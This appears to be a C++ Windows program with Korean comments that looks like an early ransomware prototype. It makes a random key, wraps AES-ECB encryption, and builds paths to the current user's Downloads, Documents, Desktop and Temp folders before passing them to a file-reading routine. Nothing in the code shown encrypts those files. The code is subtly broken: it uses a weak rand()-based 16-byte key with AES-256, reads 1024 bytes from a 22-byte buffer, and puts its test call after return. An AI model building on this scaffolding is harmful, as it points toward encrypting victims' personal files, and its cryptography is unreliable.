#include <iostream>
#include <time.h>
#include <ctime>
#include <windows.h>
#include "AES.hpp"
#include "FileAnalysis.hpp"
using namespace std;


/**
 *  램던 키 생성
*/
unsigned char* generateKey() {
    srand(std::time(nullptr));
    unsigned char* key = new unsigned char[4 * 4];;

    for (int i = 0; i < 16; i++) {
        key[i] = rand() % 256;
    }
    return key;
}


/**
 *  파일 암호화
*/
unsigned char* getEncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key) {
    AES aes(AESKeyLength::AES_256);
    unsigned char* out = aes.EncryptECB(plain, plainLength, key);
    return out;
}

/**
 *  파일 복호화
*/
unsigned char* getDecryptText(unsigned char* cipher, unsigned int cipherLength, unsigned char* key) {
    AES aes(AESKeyLength::AES_256);
    unsigned char* out = aes.DecryptECB(cipher, cipherLength, key);
    return out;
}


/**
 * 암호화 동작 테스트 함수
*/
void cryptoTest() {
    unsigned int plainLength = 1024 * sizeof(unsigned char);
    unsigned char* key = generateKey();
    unsigned char plain[] = { 'h', 'e', 'l', 'l', 'o', ' ', 'm', 'y', ' ', 'n', 'a', 'm', 'e', ' ', 'i', 's', ' ', 'a', 'h', 'r', 'o', 'k', };
    unsigned char* encryptedText = getEncryptText(plain, plainLength, key);
    unsigned char* decryptedText = getDecryptText(encryptedText, plainLength, key);
    cout << decryptedText << endl;
}


int main()
{
    DWORD username_len = UNLEN + 1;
    char userName[UNLEN + 1];
    string filename = "C:\\Users";
    string downloadname, documentsname, desktopname, foldername;

    // 사용자 이름 알아내기
    GetUserNameA(userName, &username_len);
    cout << "username: " << userName << endl;
    cout << endl;
    string userNameStr(userName);

    // 디렉토리 탐색
    downloadname = filename + "\\" + userName + "\\Downloads\\*";
    documentsname = filename + "\\" + userName + "\\Documents\\*";
    desktopname = filename + "\\" + userName + "\\Desktop\\*";
    foldername = filename + "\\" + userName + "\\AppData\\Local\\Temp\\*";

    cout << downloadname << endl;
    cout << documentsname << endl;
    cout << desktopname << endl;
    cout << foldername << endl;
    cout << endl;
    cout << endl;

    // 파일 탐색
    FileRead(0, downloadname);
    FileRead(1, documentsname);
    FileRead(2, desktopname);
    FileRead(3, foldername);

    return 0;
    cryptoTest();

}
